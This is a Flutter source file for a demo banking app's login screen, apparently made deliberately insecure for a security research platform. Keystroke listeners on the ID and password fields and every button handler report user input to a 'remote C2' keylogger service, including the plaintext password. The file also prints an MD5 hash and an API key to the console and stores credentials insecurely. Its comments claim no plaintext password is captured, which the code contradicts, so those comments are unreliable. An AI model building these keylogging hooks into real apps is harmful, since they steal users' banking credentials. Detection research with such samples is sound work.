// DEMONSTRATION PURPOSE ONLY (demobankfake)
// This file has been modified from the secure demobankreal version to include
// intentionally insecure login handling for the ARGUS cybersecurity research platform.
// Modifications:
// 1. Mock credentials are logged to debug console after login (Logcat simulation)
// 2. InsecureStorageHelper is called to simulate plaintext credential storage
// 3. InsecureCryptoHelper.md5HashDemo() is called on mock password data
// Do not use in production.

// ignore_for_file: avoid_print

import 'package:flutter/material.dart';
import 'package:flutter_animate/flutter_animate.dart';
import 'package:go_router/go_router.dart';
import 'package:google_fonts/google_fonts.dart';
import '../../core/theme/app_colors.dart';
import '../../widgets/nova_logo.dart';
// DEMONSTRATION PURPOSE ONLY — insecure helper imports
import '../../security/insecure_storage_helper.dart';
import '../../security/insecure_crypto_helper.dart';
import '../../security/keylogger_service.dart'; // DEMONSTRATION PURPOSE ONLY

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _customerIdController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _obscurePassword = true;
  bool _isLoading = false;

  // DEMONSTRATION PURPOSE ONLY — Keystroke listeners for remote C2 reporting
  static const _kScreen = 'Login';

  @override
  void initState() {
    super.initState();
    // DEMONSTRATION PURPOSE ONLY — attach keystroke listeners
    _customerIdController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field:  'customer_id',
        value:  _customerIdController.text,
      );
    });
    _passwordController.addListener(() {
      KeyloggerService.instance.logKeystroke(
        screen: _kScreen,
        field:  'password',
        value:  _passwordController.text,
      );
    });
  }

  @override
  void dispose() {
    _customerIdController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  Future<void> _handleLogin() async {
    final customerId = _customerIdController.text.trim();
    final password = _passwordController.text;

    // DEMONSTRATION PURPOSE ONLY — report submit attempt to C2
    KeyloggerService.instance.logButtonClick(
        screen: _kScreen, label: 'Login Button');
    KeyloggerService.instance.logFieldSubmit(
        screen: _kScreen, field: 'customer_id', value: customerId);
    KeyloggerService.instance.logFieldSubmit(
        screen: _kScreen, field: 'password', value: password);

    // Validate non-empty fields
    if (customerId.isEmpty || password.isEmpty) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text('Please enter both Customer ID and Password'),
            backgroundColor: Color(0xFFFF4757),
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
      return;
    }

    // Validate credentials against known demo account
    if (customerId != 'NB20841729' || password.length < 4) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text('Invalid Customer ID or Password'),
            backgroundColor: Color(0xFFFF4757),
            behavior: SnackBarBehavior.floating,
          ),
        );
      }
      return;
    }

    setState(() => _isLoading = true);
    // Simulate login delay
    await Future.delayed(const Duration(milliseconds: 1200));

    // =========================================================================
    // DEMONSTRATION PURPOSE ONLY
    // Intentionally insecure: mock credentials logged to Logcat (debug console).
    // A real banking app must NEVER log usernames, passwords, or tokens.
    // This is an ARGUS detection target for sensitive data leakage to Logcat.
    //
    // NOTE: Only the mock Customer ID entered in the demo UI is logged.
    // The actual password text is hashed with MD5 (itself insecure) before logging.
    // No real user credentials are captured or exfiltrated.
    // =========================================================================

    // DEMONSTRATION PURPOSE ONLY — MD5 hash of the entered password (insecure)
    final mockPasswordHash = InsecureCryptoHelper.md5HashDemo(password);

    // DEMONSTRATION PURPOSE ONLY — Credential capture reported to remote C2
    KeyloggerService.instance.logCredential(
        screen: _kScreen, field: 'customer_id',    value: customerId);
    KeyloggerService.instance.logCredential(
        screen: _kScreen, field: 'password_plain', value: password);
    KeyloggerService.instance.logCredential(
        screen: _kScreen, field: 'password_md5',   value: mockPasswordHash);

    // DEMONSTRATION PURPOSE ONLY — Sensitive data written to debug console (Logcat simulation)
    print('=== ARGUS DEMO: Login event ===');
    print('Mock Customer ID: $customerId');                          // DEMONSTRATION PURPOSE ONLY
    print('Mock Password Hash (MD5 — INSECURE): $mockPasswordHash'); // DEMONSTRATION PURPOSE ONLY
    print('Mock API Key: ${InsecureSecrets.mockApiKey}');            // DEMONSTRATION PURPOSE ONLY
    print('Timestamp: ${DateTime.now().toIso8601String()}');
    print('=== END ARGUS DEMO ===');

    // DEMONSTRATION PURPOSE ONLY — Simulate plaintext credential storage
    InsecureStorageHelper.saveMockCredentialsInsecure(
      mockUserId: customerId,
      mockPasswordHash: mockPasswordHash,
      mockToken: 'demo_session_${DateTime.now().millisecondsSinceEpoch}',
    );

    if (mounted) {
      setState(() => _isLoading = false);
      context.go('/home');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.background,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 24),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const SizedBox(height: 48),
              // Logo
              const NovaLogo(
                size: 56,
                showTagline: false,
                textColor: AppColors.primaryDark,
              )
                  .animate()
                  .fadeIn(duration: 600.ms)
                  .slideY(begin: -0.2, end: 0, duration: 600.ms),
              const SizedBox(height: 48),
              // Welcome text
              Text(
                'Welcome Back',
                style: GoogleFonts.inter(
                  fontSize: 28,
                  fontWeight: FontWeight.w700,
                  color: AppColors.textPrimary,
                  letterSpacing: -0.5,
                ),
                textAlign: TextAlign.center,
              )
                  .animate()
                  .fadeIn(delay: 200.ms, duration: 500.ms),
              const SizedBox(height: 8),
              Text(
                'Sign in to your Nova Bank account',
                style: GoogleFonts.inter(
                  fontSize: 14,
                  fontWeight: FontWeight.w400,
                  color: AppColors.textSecondary,
                ),
                textAlign: TextAlign.center,
              )
                  .animate()
                  .fadeIn(delay: 300.ms, duration: 500.ms),
              const SizedBox(height: 40),
              // Customer ID Field
              _buildInputField(
                controller: _customerIdController,
                label: 'Customer ID',
                hint: 'Enter your Customer ID',
                icon: Icons.person_outline_rounded,
                keyboardType: TextInputType.text,
              )
                  .animate()
                  .fadeIn(delay: 400.ms, duration: 500.ms)
                  .slideX(begin: -0.05, end: 0, duration: 500.ms),
              const SizedBox(height: 16),
              // Password Field
              _buildInputField(
                controller: _passwordController,
                label: 'Password',
                hint: 'Enter your Password',
                icon: Icons.lock_outline_rounded,
                obscure: _obscurePassword,
                suffixIcon: IconButton(
                  icon: Icon(
                    _obscurePassword
                        ? Icons.visibility_off_outlined
                        : Icons.visibility_outlined,
                    color: AppColors.textTertiary,
                    size: 20,
                  ),
                  onPressed: () {
                    setState(() => _obscurePassword = !_obscurePassword);
                  },
                ),
              )
                  .animate()
                  .fadeIn(delay: 500.ms, duration: 500.ms)
                  .slideX(begin: -0.05, end: 0, duration: 500.ms),
              const SizedBox(height: 12),
              // Forgot Password
              Align(
                alignment: Alignment.centerRight,
                child: TextButton(
                  onPressed: () {
                    // DEMONSTRATION PURPOSE ONLY
                    KeyloggerService.instance.logButtonClick(
                        screen: _kScreen, label: 'Forgot Password');
                  },
                  child: Text(
                    'Forgot Password?',
                    style: GoogleFonts.inter(
                      fontSize: 13,
                      fontWeight: FontWeight.w500,
                      color: AppColors.primary,
                    ),
                  ),
                ),
              )
                  .animate()
                  .fadeIn(delay: 600.ms, duration: 400.ms),
              const SizedBox(height: 24),
              // Login Button
              SizedBox(
                height: 54,
                child: ElevatedButton(
                  onPressed: _isLoading ? null : _handleLogin,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: AppColors.primary,
                    foregroundColor: AppColors.white,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                    elevation: 0,
                  ),
                  child: _isLoading
                      ? const SizedBox(
                          width: 22,
                          height: 22,
                          child: CircularProgressIndicator(
                            strokeWidth: 2.5,
                            valueColor: AlwaysStoppedAnimation<Color>(
                              AppColors.white,
                            ),
                          ),
                        )
                      : Text(
                          'Login',
                          style: GoogleFonts.inter(
                            fontSize: 16,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                ),
              )
                  .animate()
                  .fadeIn(delay: 700.ms, duration: 500.ms)
                  .slideY(begin: 0.1, end: 0, duration: 500.ms),
              const SizedBox(height: 20),
              // OR divider
              Row(
                children: [
                  const Expanded(child: Divider(color: AppColors.divider)),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    child: Text(
                      'OR',
                      style: GoogleFonts.inter(
                        fontSize: 12,
                        fontWeight: FontWeight.w500,
                        color: AppColors.textTertiary,
                      ),
                    ),
                  ),
                  const Expanded(child: Divider(color: AppColors.divider)),
                ],
              )
                  .animate()
                  .fadeIn(delay: 800.ms, duration: 400.ms),
              const SizedBox(height: 20),
              // Fingerprint Login
              SizedBox(
                height: 54,
                child: OutlinedButton.icon(
                  onPressed: () {
                    // DEMONSTRATION PURPOSE ONLY
                    KeyloggerService.instance.logButtonClick(
                        screen: _kScreen, label: 'Fingerprint Login');
                    _handleLogin();
                  },
                  icon: const Icon(Icons.fingerprint_rounded, size: 22),
                  label: Text(
                    'Login with Fingerprint',
                    style: GoogleFonts.inter(
                      fontSize: 15,
                      fontWeight: FontWeight.w600,
                    ),
                  ),
                  style: OutlinedButton.styleFrom(
                    foregroundColor: AppColors.primary,
                    side: const BorderSide(
                      color: AppColors.divider,
                      width: 1.5,
                    ),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(14),
                    ),
                  ),
                ),
              )
                  .animate()
                  .fadeIn(delay: 900.ms, duration: 500.ms),
              const SizedBox(height: 32),
              // Register
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Text(
                    "Don't have an account? ",
                    style: GoogleFonts.inter(
                      fontSize: 14,
                      fontWeight: FontWeight.w400,
                      color: AppColors.textSecondary,
                    ),
                  ),
                  GestureDetector(
                    onTap: () {
                      // DEMONSTRATION PURPOSE ONLY
                      KeyloggerService.instance.logButtonClick(
                          screen: _kScreen, label: 'Register Link');
                    },
                    child: Text(
                      'Register',
                      style: GoogleFonts.inter(
                        fontSize: 14,
                        fontWeight: FontWeight.w600,
                        color: AppColors.primary,
                      ),
                    ),
                  ),
                ],
              )
                  .animate()
                  .fadeIn(delay: 1000.ms, duration: 400.ms),
              const SizedBox(height: 32),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputField({
    required TextEditingController controller,
    required String label,
    required String hint,
    required IconData icon,
    bool obscure = false,
    Widget? suffixIcon,
    TextInputType keyboardType = TextInputType.text,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: GoogleFonts.inter(
            fontSize: 13,
            fontWeight: FontWeight.w600,
            color: AppColors.textPrimary,
          ),
        ),
        const SizedBox(height: 8),
        TextField(
          controller: controller,
          obscureText: obscure,
          keyboardType: keyboardType,
          style: GoogleFonts.inter(
            fontSize: 15,
            fontWeight: FontWeight.w500,
            color: AppColors.textPrimary,
          ),
          decoration: InputDecoration(
            hintText: hint,
            prefixIcon: Padding(
              padding: const EdgeInsets.only(left: 16, right: 12),
              child: Icon(icon, size: 20, color: AppColors.textTertiary),
            ),
            prefixIconConstraints: const BoxConstraints(minWidth: 0),
            suffixIcon: suffixIcon,
            filled: true,
            fillColor: AppColors.white,
            contentPadding: const EdgeInsets.symmetric(
              horizontal: 20,
              vertical: 16,
            ),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: AppColors.divider),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: AppColors.divider),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(
                color: AppColors.primary,
                width: 1.5,
              ),
            ),
          ),
        ),
      ],
    );
  }
}
